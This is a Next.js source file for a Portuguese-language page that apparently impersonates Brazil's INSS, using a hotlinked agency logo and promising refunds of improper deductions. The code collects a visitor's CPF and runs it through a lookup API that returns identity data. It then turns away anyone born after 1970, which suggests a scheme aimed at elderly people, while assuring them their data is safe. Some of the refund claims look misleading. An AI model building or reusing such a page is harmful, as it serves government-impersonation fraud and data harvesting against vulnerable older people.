'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'

export default function Home() {
  const [cpf, setCpf] = useState('')
  const [loading, setLoading] = useState(false)
  const [erro, setErro] = useState('')
  const router = useRouter()

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '')
    if (numbers.length <= 11) {
      return numbers
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
    }
    return value
  }

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    setCpf(formatted)
  }

  // Função para formatar data de nascimento (YYYY-MM-DD para DD/MM/YYYY)
  const formatarDataNascimento = (dataApi: string): string => {
    // A API retorna no formato "YYYY-MM-DD HH:MM:SS"
    const data = dataApi.split(' ')[0] // Pega apenas a parte da data
    const [ano, mes, dia] = data.split('-')
    return `${dia}/${mes}/${ano}`
  }

  // Função para verificar se a data de nascimento é acima de 1970
  const isDataAcimaDe1970 = (dataApi: string): boolean => {
    const data = dataApi.split(' ')[0] // Pega apenas a parte da data
    const [ano] = data.split('-')
    return parseInt(ano) > 1970
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setErro('')

    try {
      // Remove pontuação e traços do CPF
      const cpfLimpo = cpf.replace(/\D/g, '')
      
      console.log('Enviando requisição para API Route com CPF:', cpfLimpo)
      
      // Chamada à API Route do Next.js (evita problemas de CORS)
      const response = await fetch(
        `/api/consulta-cpf?cpf=${cpfLimpo}`
      )

      console.log('Status da resposta:', response.status)

      if (!response.ok) {
        const errorData = await response.json()
        console.error('Erro da API:', errorData)
        throw new Error(errorData.details || errorData.error || 'Erro ao consultar CPF')
      }

      const data = await response.json()
      console.log('Dados recebidos:', data)
      
      // Verifica se há erro na resposta
      if (data.error) {
        throw new Error(data.error)
      }
      
      // Verifica se a data de nascimento é acima de 1970
      if (data?.pessoa?.identificacao?.data_nascimento) {
        if (isDataAcimaDe1970(data.pessoa.identificacao.data_nascimento)) {
          setErro('Não existem valores disponíveis para este CPF.')
          setLoading(false)
          return
        }
      }
      
      // Redireciona para página de resultado com os dados
      const dadosEncoded = encodeURIComponent(JSON.stringify(data))
      router.push(`/resultado?dados=${dadosEncoded}`)
      
    } catch (error) {
      const mensagemErro = error instanceof Error ? error.message : 'Erro ao realizar a consulta. Tente novamente.'
      setErro(mensagemErro)
      console.error('Erro na consulta:', error)
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      {/* Header com Logo CENTRALIZADA E BEM GRANDE */}
      <header className="bg-white shadow-sm py-8 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto flex justify-center">
          <img
            src="https://blog.flaviarita.com/wp-content/uploads/2018/08/logo-INSS-2.png"
            alt="Logo INSS"
            className="h-48 sm:h-56 md:h-64 lg:h-80 xl:h-96 w-auto"
          />
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        {/* Hero Section com Formulário em Destaque */}
        <div className="text-center mb-12">
          <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-900 mb-8">
            Consulte Agora se Tem Valores a Receber
          </h1>

          {/* Formulário de Consulta - Centralizado e em Destaque */}
          <div className="bg-gradient-to-br from-blue-600 to-blue-700 rounded-2xl shadow-2xl p-8 sm:p-10 lg:p-12 max-w-2xl mx-auto mb-12">
            <h2 className="text-2xl sm:text-3xl font-bold text-white text-center mb-8">
              Faça sua consulta agora mesmo
            </h2>
            <form onSubmit={handleSubmit} className="max-w-md mx-auto">
              <div className="mb-6">
                <label htmlFor="cpf" className="block text-white font-semibold mb-3 text-lg">
                  Digite seu CPF:
                </label>
                <input
                  type="text"
                  id="cpf"
                  value={cpf}
                  onChange={handleCPFChange}
                  placeholder="000.000.000-00"
                  maxLength={14}
                  className="w-full px-4 py-4 text-lg rounded-lg border-2 border-white/20 bg-white/95 text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-4 focus:ring-white/50 focus:border-white transition-all"
                  required
                  disabled={loading}
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#0066CC] hover:bg-[#0052A3] text-white font-bold py-4 px-8 rounded-lg text-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
              >
                {loading ? 'Consultando...' : 'Consulte Agora!'}
              </button>
            </form>
            <p className="text-white/90 text-center mt-6 text-sm">
              🔒 Seus dados estão seguros e protegidos
            </p>
          </div>

          {/* Mensagem de Erro */}
          {erro && (
            <div className="bg-red-100 border border-red-400 text-red-700 px-6 py-4 rounded-lg max-w-2xl mx-auto mb-8">
              <p className="font-semibold">{erro}</p>
            </div>
          )}
        </div>

        {/* Conteúdo Informativo */}
        <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-8 lg:p-12 mb-8">
          <div className="prose prose-lg max-w-none">
            <p className="text-lg text-gray-700 leading-relaxed mb-6">
              O INSS tem de devolver todo real que descontou sem razão legal.
              A regra é clara: se o desconto não está previsto em lei ou no próprio contrato de concessão do benefício, ele é indevido e, portanto, devolvido com juros.
            </p>

            <h2 className="text-2xl font-bold text-gray-900 mb-4 mt-8">
              O que pode voltar para o seu bolso
            </h2>
            <ul className="space-y-3 text-gray-700 mb-8">
              <li className="flex items-start">
                <span className="text-blue-600 mr-2">•</span>
                <span>Consignado que você nunca pediu ou que ultrapassou a margem de 35%.</span>
              </li>
              <li className="flex items-start">
                <span className="text-blue-600 mr-2">•</span>
                <span>IRRF retido mesmo você sendo isento (renda mensal até R$ 2.640,00 ou 65 anos+).</span>
              </li>
              <li className="flex items-start">
                <span className="text-blue-600 mr-2">•</span>
                <span>Férias "pagas em dobro" que já haviam sido gozadas.</span>
              </li>
              <li className="flex items-start">
                <span className="text-blue-600 mr-2">•</span>
                <span>Penhora on-line ou cessão de crédito sem autorização judicial ou sua assinatura.</span>
              </li>
              <li className="flex items-start">
                <span className="text-blue-600 mr-2">•</span>
                <span>Qualquer outro desconto que não conste no extrato de concessão (lei 8.213/91, art. 154).</span>
              </li>
            </ul>
          </div>
        </div>

        {/* Footer Info */}
        <div className="text-center mt-12 text-gray-600 text-sm">
          <p>Consulta gratuita e sem compromisso</p>
        </div>
      </main>
    </div>
  )
}
